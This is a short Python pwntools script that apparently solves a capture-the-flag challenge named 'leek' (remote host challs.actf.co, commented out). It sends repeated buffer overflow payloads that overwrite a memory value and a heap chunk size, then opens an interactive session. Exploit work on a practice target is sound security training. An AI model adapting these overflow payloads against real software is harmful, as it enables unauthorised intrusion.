from pwn import *

# Set up pwntools for the correct architecture
exe = "./leek"
elf = ELF(exe)
context.log_level = "debug"
context.binary = elf
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x0000000000401649
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()
# r = remote("challs.actf.co", 31310)

for i in range(100):
    ru(b"BUFFER OVERFLOWS!!): ")
    sl(b"A"*(24) + p64(0x1010101010101010) + b"A"*32)

    s(b"A"*32)

    sl(b"A"*24 + p64(0x31))

r.interactive()